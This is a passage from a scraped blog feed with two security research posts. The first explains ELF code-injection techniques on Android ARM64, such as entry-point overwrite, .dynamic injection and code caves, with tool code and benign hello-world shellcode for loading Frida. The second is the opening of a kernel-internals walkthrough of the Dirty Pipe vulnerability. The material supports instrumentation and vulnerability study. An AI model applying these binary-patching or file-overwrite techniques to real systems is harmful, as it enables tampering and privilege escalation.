\u0026ldquo;mixed\u0026rdquo; techniques result in some form of \u0026ldquo;dead\u0026rdquo; memory, i.e. either a \u0026ldquo;dead\u0026rdquo; PHT - entry or a \u0026ldquo;dead\u0026rdquo; memory region. A solution is to avoid reparsing, i.e. call rawelf_injection independently from LIEF.\nCode Execution Making already injected code executable is key to seeing any signs of life of our code. Technically speaking, there is a plethora of ways to make code executable, but most of them are highly platform - dependent. Thus we try to focus on the most abstract methods to archive code execution.\nLIEF fully supports all following approaches, which prevents compatibility issues between the two parsers.\nEntry Point The most natural approach is to overwrite the entry point address e_entry located in the ELF - header. However, it might be unclear what to write into e_entry at the first glance. e_entry is a virtual address pointing to the first instruction executed after the OS/dynamic linker is done setting up the execution environment. As all code injection techniques discussed above work with file offsets, there needs to be a translation from file offet to virtual address. Fortunately, LIEF provides us with a function that does exactly that\nvaddr = binary.offset_to_virtual_address(off) Theoretically the conversion can be done manually aswell. For that assume that the injected code is part of a loadable segment (of type Elf64_Phdr). Then\nvaddr = (off - seg.p_offset) + seg.p_vaddr Intuition behind that is that the relative offset of a structure to the beginning of the segment that contains the structure will remain the same, regardless of whether we are in the process image or in the file. Note that this conversion might not work in general.\nThe following picture shows the general idea of this technique: .dynsym - based Injection Another idea to make code executable would be to define a symbol such that it points to the injected code. This technique is dependent on the Dynamic Linker, because the dynamic linker determines how a symbol is resolved at runtime. We would need the following assumptions:\nDynamic Linker will not resolve a symbol, if there is already a non - zero definition in .dynsym, and will use that existing definition. Target binary uses Dynamic Linking. .dynamic neither contains an entry with tag DT_BIND_NOW nor any other platform - dependent entry that enforces non - lazy binding. Also there must not be an entry with tag DT_FLAGS and value DF_BIND_NOW. This is rather nice to have than necessary, because lazy binding allows for injected code to be executed before a symbol is resolved, thus leaving a time window, in which symbol resolution can be manipulated. This time we are out of luck though. At least one of the above assumptions does not hold on our target platform and thus this technique is not applicable! If we were to manipulate relocations, we might be able to get a similar technique to work. Although it would not require .dynsym.\nThe Tradegy of Lazy Binding For this section we assume that we are looking at an Android OS (e.g. 12) on an ARM64 (i.e. AARCH64) architecture. For these platform specifications I want to explain that the dynamic linker always uses BIND_NOW, i.e. non - lazy binding!\nLets remember that, if we execute a binary (e.g. using execve), the kernel will load the binary into memory. According to AOSP , we can derive the following call stack:\nOrder Function Call Line 1. syscall(execve, argv, envp) - 2. do_execve(getname(filename), argv, envp) line 3. do_execveat_common(AT_FDCWD, filename, argv, envp, 0) line 4. bprm_execve(bprm, fd, filename, flags) line 5. exec_binprm(bprm) line 6. search_binary_handler(bprm) line 7. fmt-\u0026gt;load_binary(bprm) line In the file common/fs/binfmt_elf.c we can find the corresponding binary format that is registering load_elf_binary as the function that is called last in the call stack. Investigating that function leads us to the conclusion that the kernel may handle loading the binary. Also we can see that if the program to be executed uses an interpreter, i.e. there is a segment of type PT_INTERP, then the kernel will set the entry point to the entry point of the interpreter and start a thread at this entry point .\nThis brings us to the dynamic linker, whose \u0026ldquo;nice\u0026rdquo; entry point is linker_main . Of course we assume that we are looking at a binary that has at least one DT_NEEDED - entry in .dynamic. This will trigger a call to the function find_libraries . This function tries to load all dynamic dependencies in a very complex way. Eventually it will call soinfo::link_image with a lookup list containing descriptions of shared libraries to consider while linking:\nif (!si-\u0026gt;link_image(lookup_list, local_group_root, link_extinfo, \u0026amp;relro_fd_offset) || !get_cfi_shadow()-\u0026gt;AfterLoad(si, solist_get_head())) { return false; } Within soinfo::link_image, there is a sneaky call to relocate :\nif (!relocate(lookup_list)) { return false; } We know that the first .plt - entry will lookup symbols, if the corresponding functions are called for the first time, in case of lazy binding. This means that we now expect corresponding relocations to take place s.t. .got.plt (according to this , .got.plt holds symbol addresses used by .plt - entries) eventually contains all function addresses before the program gets in control. Thus we will look for R_AARCH64_JUMP_SLOT relocation types. Assuming the dynamic linker is compiled with USE_RELA, it will run if (!plain_relocate\u0026lt;RelocMode::JumpTable\u0026gt;(relocator, plt_rela_, plt_rela_count_)) { return false; } Following the one-liners we will wind up in process_relocation_impl . As we are assuming that our relocation type of interest is R_AARCH64_JUMP_SLOT, we get that its r_sym refers to the corresponding .dynsym - entry and is thus not 0. This will result in an r_sym == 0 - check to be false, which triggers a symbol lookup in the corresponding else:\nif (!lookup_symbol\u0026lt;IsGeneral\u0026gt;(relocator, r_sym, sym_name, \u0026amp;found_in, \u0026amp;sym)) return false; (btw. the relocator contains lookup_list).\nAgain following the control flow will reveal a call to soinfo_do_lookup :\n... soinfo_do_lookup(sym_name, vi, \u0026amp;local_found_in, relocator.lookup_list); which, after following one - liners again, brings us to a function called soinfo_do_lookup_impl . This function will resolve a given symbol by name utilising the hash sections and symbol versioning. Eventually, it returns an instance of Elf64_Sym that is forwarded all the way back to process_relocation_impl. It will be used to compute the correct address of the symbol via\nElfW(Addr) resolve_symbol_address(const ElfW(Sym)* s) const { if (ELF_ST_TYPE(s-\u0026gt;st_info) == STT_GNU_IFUNC) { return call_ifunc_resolver(s-\u0026gt;st_value + load_bias); } return static_cast\u0026lt;ElfW(Addr)\u0026gt;(s-\u0026gt;st_value + load_bias); } As most symbols are of type STT_FUNC, we just consider the second return statement.\nFinally, the result of resolve_symbol_address(sym) is stored in sym_addr and used in\nif constexpr (IsGeneral || Mode == RelocMode::JumpTable) { if (r_type == R_GENERIC_JUMP_SLOT) { count_relocation_if\u0026lt;IsGeneral\u0026gt;(kRelocAbsolute); const ElfW(Addr) result = sym_addr + get_addend_norel(); trace_reloc(\u0026#34;RELO JMP_SLOT %16p \u0026lt;- %16p %s\u0026#34;, rel_target, reinterpret_cast\u0026lt;void*\u0026gt;(result), sym_name); *static_cast\u0026lt;ElfW(Addr)*\u0026gt;(rel_target) = result; return true; } } This will write the address of the symbol into the corresponding .got.plt - entry.\nAll in all this happens at startup of a program. We started at execve and only considered dynamic linker code that is executed before the program gets in charge (i.e. before the dynamic linker returns from linker_main). Therefore the dynamic linker always uses BIND_NOW.\nSymbol Hashing and LIEF In order to quickly determine, whether a symbol is defined in an ELF - file, two sections can be utilised:\n.gnu.hash .hash We will only focus on .gnu.hash, because it suffices for showcasing the problem.\nFrom the previous section we know that the dynamic linker performs a symbol lookup via soinfo_do_lookup_impl . To be precise, it will iterate over all libraries defined in lookup_list and use the Bloom filter in .gnu.hash to check whether a symbol is defined in an ELF - file or not. If the Bloom filter \u0026ldquo;says no\u0026rdquo;, the symbol is not defined in that ELF - file with probability assumed to be 100%. If the Bloom filter \u0026ldquo;says probably yes\u0026rdquo;, then further checks are needed to identify whether the symbol is really defined in that ELF - file (for those interested, see this ).\nThis implies that there needs to be an entry in .gnu.hash in order for the dynamic linker to take a corresponding symbol definition into account. Unfortunately, LIEF does not create a new entry in .gnu.hash upon adding a new symbol to .dynsym. Neither does rawelf_injection, as it was designed according to System V gABI, which does not even mention .gnu.hash. Therefore overwriting an existing symbol in .dynsym using rawelf_injection will also not create/overwrite a .gnu.hash - entry. This leaves us with overwriting symbols, whose symbol names are already defined in .gnu.hash of the ELF - file we are manipulating. Thus we cannot overwrite symbols that are defined in other shared object files unless we manipulate the respective libraries. Lets assume we have a symbol to overwrite, then there is a limitation to what the corresponding .dynsym - entry must look like. Notice that in soinfo_do_lookup_impl there is a call to is_symbol_global_and_defined :\ninline bool is_symbol_global_and_defined(const soinfo* si, const ElfW(Sym)* s) { if (__predict_true(ELF_ST_BIND(s-\u0026gt;st_info) == STB_GLOBAL || ELF_ST_BIND(s-\u0026gt;st_info) == STB_WEAK)) { return s-\u0026gt;st_shndx != SHN_UNDEF; } else if (__predict_false(ELF_ST_BIND(s-\u0026gt;st_info) != STB_LOCAL)) { DL_WARN(\u0026#34;Warning: unexpected ST_BIND value: %d for \\\u0026#34;%s\\\u0026#34; in \\\u0026#34;%s\\\u0026#34; (ignoring)\u0026#34;, ELF_ST_BIND(s-\u0026gt;st_info), si-\u0026gt;get_string(s-\u0026gt;st_name), si-\u0026gt;get_realpath()); } return false; } This function has to return true in order for our symbol to be returned by soinfo_do_lookup_impl. Therefore, its binding must ensure that the symbol is globally available, i.e. either STB_GLOBAL or STB_WEAK, and the symbol has to be defined in relation to some section, whose index is not 0. (We have not talked about symbol version checks yet that introduce further complexity if there is a section of type SHT_VERSYM. Note that check_symbol_version also has to return true for the symbol resolution to succeed.)\nThus manipulating .dynsym of an ELF - file is limited to the symbols that have a corresponding .gnu.hash - entry.\nCombining the facts that the dynamic linker defaults to BIND_NOW and uses hash tables like .gnu.hash and .hash, overwriting a .dynsym - entry will be ignored and changes in e.g. .got.plt will be overwritten, if there is no corresponding hash entry. Having lazy - binding would relax the situation a bit, as the symbol lookup would be delayed as much as possible, allowing further manipulations at runtime. BIND_NOW enforces the existence of a hash table entry at startup in order for .dynsym - based injection to work. Alternatively we could overwrite a relocation entry of type R_AARCH64_JUMP_SLOT, which does not seem to require any other changes than in .rel(a).plt.\n.dynamic - based Injection Finally, the most common technique is described. This approach requires dynamic linking, i.e. if the target binary is statically linked and there is no .dynamic - section, then this technique will not work. Also we assume that all inserted .dynamic - entries have the tag DT_NEEDED to allow loading arbitrary shared object files. The corresponding d_val is an offset into .dynstr.\nThe following subtechniques can be derived:\nInserting a new .dynamic - entry into .dynamic and a new string into .dynstr. Like in segment - based injection, this is the least intrusive and only reversible technique and is supported by LIEF. One issue is that it requires new memory to be inserted. E.g. on an ARM64 architecture with Android 12 (API level 31) and a NDK r23b build of a \u0026ldquo;Hello World\u0026rdquo; - application, .dynamic is located between .plt and .got/.got.plt. Therefore, inserting new memory will invalidate cross - references. Similar to the above, overwriting an existing .dynamic - entry and inserting a new string results in a recomputation of all patchable references. Inserting a new .dynamic - entry with a chosen string offset as d_val requires to find a \u0026ldquo;suitable\u0026rdquo; substring in .dynstr. Thinking of Frida, this substring should be of the form \u0026ldquo;substring.so\u0026rdquo;. This allows the use of configuration files for frida-gadget.so. At last we can overwrite an existing .dynamic - entry and use a \u0026ldquo;suitable\u0026rdquo; substring. Notice that some compilers (like e.g. gcc) like to generate a .dynamic - entry with tag DT_DEBUG. Its value is application - dependent. As this is marked as optional in System V gABI, it can be overwritten. If the application needs this .dynamic - entry, then you will have to restore this entry in the initialisation function of your shared object file. One main concern is that LIEF does not support using substrings. If LIEF sees that a .dynamic - entry with tag DT_NEEDED is inserted, it will insert a new string. Thus rawelf_injection will be used for substring - related techniques. Also overwriting an existing .dynamic - entry and inserting a new string is implemented by using the sequence\nbinary.remove(binary.dynamic_entries[index]) binary.add_library(string) If the .dynamic - entry indexed by index is e.g. a DT_NEEDED - entry, then LIEF will also remove the corresponding string from .dynstr. One must be cautious when removing .dynamic - entries with LIEF.\nLets consider a figure that describes the last subtechnique: Applicability Having seen all of those techniques, we should summarise what techniques are usable and under which circumstances. For that, please see the following table. The test environment is always on AMR64 and Android 12 (API level 31). Notice that we consider LIEF as a black - box and assume its correctness to be given.\nTechnique Subtype Usable Constraints \u0026amp; Challenges Insert Memory - Yes adrp, invalid cross - references, inserting memory after loadable with p_filesz=0, permissions, overlapping loadables Code Caves Extension Yes segment permissions, adrp, overlapping loadables PHT Insert Yes Insert Memory issues, possibly order of loadables, \u0026hellip; PHT Overwrite Yes finding \u0026ldquo;suitable\u0026rdquo; PHT - entry, adrp because different p_memsz, possibly order of loadables, \u0026hellip; Segments Inject(PHT)+Inject(Memory) Yes None, unless LIEF messes up Overwrite+Overwrite Rather no finding \u0026ldquo;suitable\u0026rdquo; PHT - entry, finding \u0026ldquo;suitable\u0026rdquo; segment, adrp because different p_memsz, possibly order of loadables Overwrite+Inject Rather yes Insert Memory issues, finding \u0026ldquo;suitable\u0026rdquo; PHT - entry, possibly order of loadables Inject+Overwrite Rather no Insert Memory issues, finding \u0026ldquo;suitable\u0026rdquo; segment, possibly order of loadables Entry Point - Yes need virtual address .dynsym Insert Symbol No Dynamic Linker always uses BIND_NOW, need specific hash table entries Overwrite Symbol No Insert Symbol issues .dynamic Inject(.dynamic)+Inject(.dynstr) Yes None, unless LIEF messes up Overwrite+Inject Yes None, unless LIEF messes up Inject+Substring Yes finding \u0026ldquo;suitable\u0026rdquo; substring Overwrite+Substring Yes finding \u0026ldquo;suitable\u0026rdquo; substring, finding \u0026ldquo;suitable\u0026rdquo; .dynamic - entry It is needless to say that overwriting vital structures like e.g. the ELF - header will completely break the binary. Always think about it twice when considering to overwrite something.\nAll in all we can see that most techniques work. I must emphasize that the above table is solely based on tests on a single platform for a single binary. Although theoretically correct, in practice many techniques can still fail due to bugs in the implementation on my side or deviations from specifications and standards on the vendor\u0026rsquo;s side. Also you should take the \u0026ldquo;Usable\u0026rdquo; - column with a grain of salt: it highly assumes that the user knows what he/she is doing. Blindly injecting memory will most likely result in segmentation faults.\nPractical Examples In this section we want to see whether these techniques can be used to make Frida work. Notice that for simplicity, we will only use .dynamic - based injection to get Frida to run. This is justified by the fact that writing shellcode that is able to either track down dlopen and thus libc or load a shared object file manually is non - trivial. To prove that other techniques work aswell I will provide shellcode that writes a plain \u0026ldquo;Hello World!\u0026rdquo; text to stdout and exits with code 42.\nExperiment Setup In order to test the library, one may go ahead and create an Android Virtual Device (AVD) with API level 31 or above to support aarch64 - binaries (i.e. ARM64). Then run the emulator, e.g. via console\nemulator -avd Pixel_3_API_31 where emulator is a tool in the Android SDK. The name of the AVD may differ.\nThen use adb to get a shell into the emulator using\nadb shell This assumes that there is only one emulator running. Otherwise you need to specify the avd or its debug port.\nFinally, cross-compile a C program of your choice by utilising the Android NDK or take a binary that is a result of the Ahead-Of-Time step of ART. Either way you should end up with an ELF - file. When cross - compiling a C program, use\nadb push /path/to/binary /local/data/tmp/binary to get the binary into the emulator.\nAs the python library only runs on AMD64, you should apply the techniques before pushing the ELF - file to the emulator.\nHello World - Example Lets use code cave - based injection. For simplicity, we assume that there is a code cave between loadable segments.\n#import lief from ElfInjection.Binary import ElfBinary from ElfInjection.CodeInjector import ElfCodeInjector from ElfInjection.Seekers.CodeCaveSeeker import * def main(): # 0. Introduce artificial code cave #binary = lief.parse(\u0026#39;./libs/arm64-v8a/hello\u0026#39;) #binary.add(binary.get(lief.ELF.SEGMENT_TYPES.LOAD)) #binary.add(binary.get(lief.ELF.SEGMENT_TYPES.LOAD)) #binary.write(\u0026#39;./libs/arm64-v8a/hello\u0026#39;) # 1. Setup variables shellcode = (b\u0026#39;\\x0e\\xa9\\x8c\\xd2\\x8e\\x8d\\xad\\xf2\\xee\u0026#39; + b\u0026#39;\\r\\xc4\\xf2\\xee\\xea\\xed\\xf2O\\x8e\\x8d\\xd2\\x8f,\u0026#39; + b\u0026#39;\\xa4\\xf2O\\x01\\xc0\\xf2\\xee?\\xbf\\xa9 \\x00\\x80\u0026#39; + b\u0026#39;\\xd2\\xe1\\x03\\x00\\x91\\xa2\\x01\\x80\\xd2\\x08\\x08\u0026#39; + b\u0026#39;\\x80\\xd2\\x01\\x00\\x00\\xd4@\\x05\\x80\\xd2\\xa8\\x0b\u0026#39; + b\u0026#39;\\x80\\xd2\\x01\\x00\\x00\\xd4\u0026#39;) # 2. Get the binary binary = ElfBinary(\u0026#39;./libs/arm64-v8a/hello\u0026#39;) injector = ElfCodeInjector(binary) # 3. Create cave seeker and search for caves of size # at least 0x100 seeker = ElfSegmentSeeker(0x100) caves = injector.findCodeCaves(seeker) # 4. Find suitable code cave... cave = caves[1] # 5. Adjust a loadable segment. This should also be executable! cave.size = len(shellcode) sc, _ = injector.injectCodeCave(None, cave, shellcode) # 6. Overwrite entry point to point to whereever shellcode is old = injector.overwriteEntryPoint(sc.vaddr) # 7. Store to file binary.store(\u0026#39;./libs/arm64-v8a/tmp\u0026#39;) if (__name__ == \u0026#39;__main__\u0026#39;): main() The above code will search for a code cave that is at least 0x100 bytes in size. Then it will select the second match, fill the cave with shellcode and set the entry point to point to the shellcode. Notice that the code cave will be appended to an executable segment. The target is the same binary as in the next example.\nAlso notice that we need to artificially introduce two loadable, executable segments in order to find a code cave. If such an action is necessary to perform code cave based injection, you must reconsider whether code cave based injection is the correct choice.\n.dynamic - Injection Example Finally, for .dynamic - based injection please consider the following code:\nimport lief from ElfInjection.Binary import ElfBinary from ElfInjection.CodeInjector import ElfCodeInjector from ElfInjection.Manipulators.DynamicManipulator import ElfDynamicOverwriter from ElfInjection.Manipulators.StringManipulator import ElfStringFinder def main(): # 1. Get the binary binary = ElfBinary(\u0026#39;./libs/arm64-v8a/hello\u0026#39;) injector = ElfCodeInjector(binary) # 2. Create overwriter dyn_overwriter = ElfDynamicOverwriter( tag=lief.ELF.DYNAMIC_TAGS.NEEDED, value=0, index=6 ) # 3. Create string finder str_finder = ElfStringFinder() # 4. Overwrite .dynamic entry with substring dyn_info = injector.injectDynamic( str_finder, dyn_overwriter ) # 5. Store to file binary.store(\u0026#39;./libs/arm64-v8a/tmp\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: main() Because we are using an ElfStringFinder, there is no user - supplied string injected into .dynstr. Note that the user is responsible for providing the requested shared object file, e.g. by setting LD_LIBRARY_PATH. We are manipulating the following program\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char *text = \u0026#34;Hello World!\\n\u0026#34;; while (1) { write(1, text, strlen(text)); sleep(1); } } compiled on AMD64, Ubuntu 20.04.1 LTS with Android NDK r23b\nndk-build Investigating .dynamic yields:\nreadelf --wide --dynamic manipulated.bin ... 0x0000000000000001 (NEEDED) Shared library: [libc.so] 0x0000000000000001 (NEEDED) Shared library: [libm.so] 0x0000000000000001 (NEEDED) Shared library: [libstdc++.so] 0x0000000000000001 (NEEDED) Shared library: [libdl.so] 0x000000000000001e (FLAGS) BIND_NOW 0x000000006ffffffb (FLAGS_1) Flags: NOW PIE 0x0000000000000001 (NEEDED) Shared library: [c.so] 0x0000000000000007 (RELA) 0x1490 ... To see Frida in action, we first need to set the gadget\u0026rsquo;s bind address to an IP we can connect to (i.e. not localhost):\n{ \u0026#34;interaction\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;listen\u0026#34;, \u0026#34;address\u0026#34;: \u0026#34;\u0026lt;IP\u0026gt;\u0026#34;, \u0026#34;port\u0026#34;: 27042, \u0026#34;on_port_conflict\u0026#34;: \u0026#34;fail\u0026#34;, \u0026#34;on_load\u0026#34;: \u0026#34;wait\u0026#34; } } Name this file \u0026ldquo;c.config.so\u0026rdquo;.\nNow run the following in separate shells to see Frida in action. The first shell should run something like this, setting up the test program.\nmv frida-gadget.so c.so LD_LIBRARY_PATH=. ./manipulated.bin And the second shell should do the tracing:\nfrida-trace -H \u0026lt;IP\u0026gt;:27042 -n \u0026#34;Gadget\u0026#34; -i \u0026#34;write\u0026#34; Sources https://cs.android.com/android https://frida.re https://frida.re/docs/gadget/ https://github.com/fkie-cad/ELFbin https://github.com/frida/frida/releases https://github.com/lief-project/LIEF https://gitlab.com/x86-psABIs/x86-64-ABI https://man7.org/linux/man-pages/man2/ptrace.2.html https://man7.org/linux/man-pages/man8/ld.so.8.html http://www.sco.com/developers/gabi/latest/contents.html http://www.sco.com/developers/gabi/latest/ch4.reloc.html ","permalink":"https://lolcads.github.io/posts/2022/07/make_frida_great_again/","tags":["Frida","ELF","Code Injection"],"title":"Make Frida Great Again"},{"categories":null,"content":"Intro This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described here . If you haven\u0026rsquo;t read the original publication yet, we\u0026rsquo;d suggest that you read it first (maybe also twice ;)). While Kellermann\u0026rsquo;s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what\u0026rsquo;s going on we\u0026rsquo;d like to shed some light on specific kernel internals. The aim of this post is to share our knowledge and to provide a resource for other interested individuals. The idea of this post is as follows: We take a small proof-of-concept (PoC) program and divide it into several stages. Each stage issues a system call (or syscall for short), and we will look inside the kernel to understand which actions and state changes occur in response to those calls. For this we use both, the kernel source code (elixir.bootlin.com , version 5.17.9) and a kernel debugging setup (derived from linux-kernel-debugging ). The Dirty Pipe-specific debugging setup and the PoC code is provided in a GitHub repository.\nOur Goal / Disclaimer It\u0026rsquo;s important to talk about the goal of our investigation first:\nDo we want to understand how the Linux kernel works in general? Maybe not right now\u0026hellip; Do we want to know what the vulnerability is? Why it occurs? How it can be exploited? Yes! It is important to keep in mind, what we want to achieve. The Linux kernel is a very complex piece of software. We have to leave some blind spots, but that\u0026rsquo;s absolutely okay :)\nThus, when we show kernel source code we will often hide parts that are not directly relevant for our discussion to improve readability. In general, those parts may very well be security-relevant and we encourage you to follow the links to review the original code. In particular, if you want to find your own vulnerabilities or become a kernel hacker you should spend more time to understand (all) the mechanisms and details! ;)\nPage Cache The page cache plays an important role in the Dirty Pipe vulnerability so let\u0026rsquo;s see what it is and how it works first.\nThe physical memory is volatile and the common case for getting data into the memory is to read it from files. Whenever a file is read, the data is put into the page cache to avoid expensive disk access on the subsequent reads. Similarly, when one writes to a file, the data is placed in the page cache and eventually gets into the backing storage device. The written pages are marked as dirty and when Linux decides to reuse them for other purposes, it makes sure to synchronize the file contents on the device with the updated data. source In particular, the above means that if any process on the system (or the kernel itself) requests data from a file that is already cached, the cached data is used instead of accessing the disk. Of course there are ways to influence this behavior by using flags (O_DIRECT | O_SYNC) when opening a file, or by explicitly instructing the kernel to synchronize dirty pages. You could also discard the cached pages using the sysfs pseudo file system: # echo 1 \u0026gt; /proc/sys/vm/drop_caches. However, in most situations the cached data is what is ultimately used by the kernel (and thus also the user processes).\nAt this point we can already tease what the Dirty Pipe vulnerability is all about: It will allow us to overwrite the cached data of any file that we are allowed to open (read-only access is sufficient), without the page cache actually marking the overwritten page as \u0026lsquo;dirty\u0026rsquo;. Thus, we can trick the system into thinking that the file contents changed (at least for a while) without leaving traces on disk.\nBut let\u0026rsquo;s not get ahead of ourselves, the goal is after all to understand why this happens. As we can see, the first thing our PoC does, is opening a file for reading, without any additional flags.\nint tfd; ... pause_for_inspection(\u0026#34;About to open() file\u0026#34;); tfd = open(\u0026#34;./target_file\u0026#34;, O_RDONLY); ⬀ go to source code The kernel function handling our open user space call is do_sys_openat2(). It attempts to get the file in the desired mode, and if everything succeeds it installs a new file descriptor that is backed by the file and returns it (the file descriptor is just an integer).\nstatic long do_sys_openat2(int dfd, const char __user *filename, struct open_how *how) { struct open_flags op; int fd = build_open_flags(how, \u0026amp;op); struct filename *tmp; ... tmp = getname(filename); ... fd = get_unused_fd_flags(how-\u0026gt;flags); ... struct file *f = do_filp_open(dfd, tmp, \u0026amp;op); // lolcads: maybe follow ... // but don\u0026#39;t get lost ;) ... if (IS_ERR(f)) { // lolcads: e.g. permission checks failed, doesn\u0026#39;t exist... put_unused_fd(fd); fd = PTR_ERR(f); } else { fsnotify_open(f); fd_install(fd, f); } putname(tmp); return fd; // lolcads: breakpoint 1 } ⬀ go to source code Following the call to do_filp_open() bears the danger of getting lost in the jungle of the (virtual) file system. To avoid going down that rabbit hole we place our first breakpoint on the return statement. This gives us the opportunity to find the struct file that is backing the file descriptor our PoC process receives.\nstruct file { ... struct path f_path; struct inode *f_inode; const struct file_operations *f_op; ... struct address_space *f_mapping; ... }; ⬀ go to source code Importantly, the f_mapping field leads us to the struct address_space that represents the page cache object associated to the file. The a_ops field points to implementations of typical operations one might want to perform on a page cache object e.g., reading ahead, marking pages as dirty or writing back dirty pages, and so on.\nstruct address_space { struct inode *host; struct xarray i_pages; ... unsigned long nrpages; pgoff_t writeback_index; const struct address_space_operations *a_ops; unsigned long flags; ... } ⬀ go to source code The actual cached data lies on one or more pages somewhere in physical memory. Each and every page of physical memory is described by a struct page. An extendable array (struct xarray) containing pointers to those page structs can be found in the i_pages field of the struct address_space.\nstruct page { unsigned long flags; ... /* Page cache and anonymous pages */ struct address_space *mapping; pgoff_t index; /* Our offset within mapping. */ ... /* * If the page can be mapped to userspace, encodes the number * of times this page is referenced by a page table. */ atomic_t _mapcount; /* * If the page is neither PageSlab nor mappable to userspace, * the value stored here may help determine what this page * is used for. See page-flags.h for a list of page types * which are currently stored here. */ unsigned int page_type; ... /* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */ atomic_t _refcount; ... /* * On machines where all RAM is mapped into kernel address space, * we can simply calculate the virtual address. On machines with * highmem some memory is mapped into kernel virtual memory * dynamically, so we need a place to store that address. * Note that this field could be 16 bits on x86 ... ;) * * Architectures with slow multiplication can define * WANT_PAGE_VIRTUAL in asm/page.h */ void *virtual; /* Kernel virtual address (NULL if not kmapped, ie. highmem) */ } ⬀ go to source code The last comment gives a hint at how to find the actual page of physical memory described by this struct within the kernel\u0026rsquo;s virtual address space. (The kernel maps all of physical memory into its virtual address space so we know its somewhere. Refer to the documentation for more details.)\n======================================================================================================================== Start addr | Offset | End addr | Size | VM area description ======================================================================================================================== ... ffff888000000000 | -119.5 TB | ffffc87fffffffff | 64 TB | direct mapping of all physical memory (page_offset_base) ... The key to finding the \u0026rsquo;needle in the haystack\u0026rsquo; is another region of the kernel\u0026rsquo;s virtual address space.\nThe sparse vmemmap uses a virtually mapped memory map to optimize pfn_to_page and page_to_pfn operations. There is a global struct page *vmemmap pointer that points to a virtually contiguous array of struct page objects. A PFN is an index to that array and the offset of the struct page from vmemmap is the PFN of that page. source ======================================================================================================================== Start addr | Offset | End addr | Size | VM area description ======================================================================================================================== ... ffffe90000000000 | -23 TB | ffffe9ffffffffff | 1 TB | ... unused hole ffffea0000000000 | -22 TB | ffffeaffffffffff | 1 TB | virtual memory map (vmemmap_base) ffffeb0000000000 | -21 TB | ffffebffffffffff | 1 TB | ... unused hole ... In the debugger we can confirm that the address of the struct page associated to the struct address_space of the target_file our poc process opened indeed lies within this range.\nstruct task_struct at 0xffff888103a71c80 \u0026gt; \u0026#39;pid\u0026#39;: 231 \u0026gt; \u0026#39;comm\u0026#39;: \u0026#34;poc\u0026#34;, \u0026#39;\\000\u0026#39; \u0026lt;repeats 12 times\u0026gt; struct file at 0xffff8881045b0800 \u0026gt; \u0026#39;f_mapping\u0026#39;: 0xffff8881017d9460 \u0026gt; filename: target_file struct address_space at 0xffff8881017d9460 \u0026gt; \u0026#39;a_ops\u0026#39;: 0xffffffff82226ce0 \u0026lt;ext4_aops\u0026gt; \u0026gt; \u0026#39;i_pages.xa_head\u0026#39; : 0xffffea0004156880 \u0026lt;- here! The kernel implements the translation of this address into a position in the contiguous mapping of all physical memory using a series of macros that hide behind a call to lowmem_page_address / page_to_virt .\n#define page_to_virt(x) __va(PFN_PHYS(page_to_pfn(x))) #define page_to_pfn __page_to_pfn #define __page_to_pfn(page) (unsigned long)((page) - vmemmap) // (see .config: CONFIG_SPARSEMEM_VMEMMAP=y) #define vmemmap ((struct page *)VMEMMAP_START) # define VMEMMAP_START vmemmap_base // (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y) #define PFN_PHYS(x) ((phys_addr_t)(x) \u0026lt;\u0026lt; PAGE_SHIFT) #define PAGE_SHIFT 12 #define __va(x) ((void *)((unsigned long)(x)+PAGE_OFFSET)) #define PAGE_OFFSET ((unsigned long)__PAGE_OFFSET) #define __PAGE_OFFSET page_offset_base // (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y) When following the macros, make sure to consider your architecture (e.g., x86) and check for compile time definitions in the .config file of your build (e.g., CONFIG_DYNAMIC_MEMORY_LAYOUT=y). The values of vmemmap_base and page_offset_base are in general effected by KASLR but can be determined at runtime e.g., by using the debugger.\nEquipped with this knowledge, we can script the debugger to do this calculation for us and print the cached data of the file we opened.\nstruct page at 0xffffea0004156880 \u0026gt; virtual: 0xffff8881055a2000 \u0026gt; data: b\u0026#39;File owned by root!\\n\u0026#39;[...]b\u0026#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; Inspecting the file permissions confirms that we are indeed not allowed to write to it.\n-rw-r--r-- 1 root root 20 May 19 20:15 target_file\nNext, we are going to explore the second kernel subsystem involved in the Dirty Pipe vulnerability.\nPipes (general) Pipes are a unidirectional inter-process communication (IPC) mechanism found in UNIX-like operating systems. In essence, a pipe is a buffer in kernel space that is accessed by processes through file descriptors. Unidirectionality means that there are two types of file descriptors, read and write ones:\nint pipefds[2]; pipe(pipefds); ┌───────────────────┐ write() ---\u0026gt; pipefds[1] │\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;│ pipefds[0] ---\u0026gt; read() └───────────────────┘ Upon creating a pipe the calling process receives both file descriptors, but usually it proceeds by distributing one or both of the file descriptors to other processes (e.g., by fork/cloneing or through UNIX domain sockets) to facilitate IPC. They are, for example, used by shells to connect stdout and stdin of the launched sub-processes.\n$ strace -f sh -c \u0026#39;echo \u0026#34;Hello world\u0026#34; | wc\u0026#39; 2\u0026gt;\u0026amp;1 | grep -E \u0026#34;(pipe|dup2|close|clone|execve|write|read)\u0026#34; ... sh: pipe([3, 4]) = 0 // parent shell creates pipe sh: clone(...) // spawn child shell that will do echo (build-in command) sh: close(4) = 0 // parent shell does not need writing end anymore echo sh: close(3) // close reading end echo sh: dup2(4, 1) = 0 // set stdout equal to writing end echo sh: close(4) // close duplicate writing end echo sh: write(1, \u0026#34;Hello world\\n\u0026#34;, 12) = 12 // child shell performs write to pipe ... sh: clone(...) // spawn child shell that will later execve wc sh: close(3) = 0 // parent shell does not need reading end anymore ... wc sh: dup2(3, 0) = 0 // set stdin equal to reading end wc sh: close(3) = 0 // close duplicate reading end wc sh: execve(\u0026#34;/usr/bin/wc\u0026#34;, [\u0026#34;wc\u0026#34;],...) // exec wc wc: read(0, \u0026#34;Hello 